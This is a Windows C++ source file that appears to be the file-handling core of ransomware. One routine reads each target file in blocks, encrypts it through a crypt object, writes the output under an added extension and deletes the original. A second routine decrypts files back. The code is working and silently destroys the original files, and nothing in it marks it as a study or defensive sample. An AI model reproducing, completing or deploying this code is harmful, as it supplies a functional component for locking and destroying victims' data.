#include "stdafx.h"
#include "rw.h"

file::file()
{
}

file::~file()
{
}

void file::startProcedureOnFile(std::wstring file, crypt *cryptObj) {
	using namespace std;
	BOOL isLastBlock=FALSE;
	DWORD readBytes;
	DWORD errorCode;
	BOOL EOFstate;
	byte readBuf[2048];
	//first trim path
	auto prevFilename = file.substr(file.find_last_of('\\')+1);
	auto filePath = file.substr(0, file.find_last_of('\\')+1);
	auto prevFileExt = prevFilename.substr(prevFilename.find_last_of('.') + 1);
	auto prevFileWoutExt = prevFilename.substr(0, prevFilename.find_last_of('.'));
	//intro done here
	wstring encFileWPath(file);
	encFileWPath += encExt;
	
	auto PrevFileHandle = CreateFile(file.c_str(), GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (PrevFileHandle == INVALID_HANDLE_VALUE) {
		errorCode = GetLastError();
		//cout << "error opening file: " << errorCode << endl;
		return;
	}

	auto EncFileHandle = CreateFile(encFileWPath.c_str(), GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (EncFileHandle == INVALID_HANDLE_VALUE) {
		errorCode=GetLastError();
		//cout << "error opening file: " << errorCode <<  endl;
		return;
	}
	
	
	while (1)
	{
		
		EOFstate = ReadFile(PrevFileHandle, readBuf, 2048, &readBytes, NULL);
		if (readBytes < 2048) {
			isLastBlock = TRUE;
		}
		if (EOFstate && readBytes == 0) {
			//wcout << L"eof detected" << endl;
			break;
		}
		else {
			cryptObj->encryptBuffer(readBuf, readBytes, isLastBlock);
			WriteFile(EncFileHandle, readBuf, readBytes, &readBytes, NULL);
		}
	}


	CloseHandle(EncFileHandle); 
	CloseHandle(PrevFileHandle);
	DeleteFile(file.c_str());
}
void file::decryptProcedure(std::wstring file, crypt *cryptObj) {
	using namespace std;
	DWORD readBytes;
	BOOL isLastBlock = FALSE;
	BOOL EOFstate;
	byte readBuf[2048];
	auto prevFileWoutExt = file.substr(0, file.find_last_of('.'));
	//wcout << prevFileWoutExt << endl;
	auto decFileHandle = CreateFile(prevFileWoutExt.c_str(), GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (decFileHandle == INVALID_HANDLE_VALUE) {
		return;
	}
	auto PrevFileHandle = CreateFile(file.c_str(), GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (PrevFileHandle == INVALID_HANDLE_VALUE) {
		return;
	}

	while (1)
	{

		EOFstate = ReadFile(PrevFileHandle, readBuf, 2048, &readBytes, NULL);
		if (readBytes < 2048) {
			isLastBlock = TRUE;
		}
		if (EOFstate && readBytes == 0) {
			//wcout << L"eof detected" << endl;
			break;
		}
		else {
			cryptObj->decryptBuffer(readBuf, readBytes, isLastBlock);
			WriteFile(decFileHandle, readBuf, readBytes, &readBytes, NULL);
		}
	}

	CloseHandle(decFileHandle);
	CloseHandle(PrevFileHandle);
	DeleteFile(file.c_str());
}